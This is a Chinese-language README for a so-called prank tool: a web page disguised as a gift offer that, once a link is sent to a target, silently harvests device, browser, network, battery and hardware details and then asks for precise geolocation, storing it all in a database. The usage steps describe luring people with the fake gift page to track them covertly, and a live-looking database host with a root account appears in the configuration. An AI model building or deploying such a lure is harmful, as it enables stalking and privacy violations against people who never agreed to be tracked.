# 🎁 整人小工具 (Prank Tool)

一个有趣的小工具，当有人打开链接时，可以收集他们的设备信息和位置。

## ⚠️ 免责声明

本工具仅供学习和娱乐使用，请勿用于任何非法目的。使用本工具收集他人信息时，请确保遵守当地法律法规。

## 📦 功能特性

收集的信息包括：
- 📍 **位置信息**：经纬度、精度、海拔、移动方向和速度
- 📱 **设备信息**：操作系统、屏幕分辨率、设备像素比
- 🌐 **浏览器信息**：浏览器类型、版本、语言、时区
- 📶 **网络信息**：网络类型、下行速度、延迟
- 🔋 **电池信息**：电量、是否充电
- 💻 **硬件信息**：CPU核心数、内存大小、触摸点数

## 🚀 部署方式

### 方式一：Docker Compose（推荐）

```bash
# 进入项目目录
cd prank-tool

# 构建并启动
docker-compose up -d --build

# 查看日志
docker-compose logs -f
```

### 方式二：手动部署

#### 后端

```bash
cd backend
pip install -r requirements.txt
python app.py
```

#### 前端

```bash
cd frontend
# 直接用 nginx 托管 index.html
```

## 🔧 配置说明

### 数据库配置

在 `backend/config.py` 或环境变量中配置：

```python
DB_HOST = '106.14.227.122'
DB_PORT = '3306'
DB_USER = 'root'
DB_PASSWORD = 'your_password'
DB_NAME = 'freshbird'
```

### API 端点

- `POST /api/collect` - 收集访客信息
- `GET /api/visitors` - 获取访客列表（管理接口）
- `GET /api/visitor/<id>` - 获取单个访客详情

## 📊 访问方式

部署完成后：
- 前端页面：http://your-server:8088
- 后端 API：http://your-server:5001

## 🎭 使用方法

1. 部署完成后，将链接 `http://your-server:8088` 发送给目标用户
2. 用户打开链接后会看到一个"领取礼物"的页面
3. 页面会在后台静默收集基础信息
4. 当用户点击"领取礼物"时，会请求位置权限
5. 所有信息都会发送到数据库中保存

## 🗃️ 数据库表

表名：`prank_visitor_info`

可以使用 SQL 文件初始化：

```bash
mysql -u root -p freshbird < sql/init.sql
```

## 🔒 安全提示

1. 建议仅在受控环境中使用
2. 不要将管理接口暴露到公网
3. 定期清理收集的数据
4. 遵守相关隐私法规

## 📝 许可证

MIT License - 仅供学习和娱乐使用

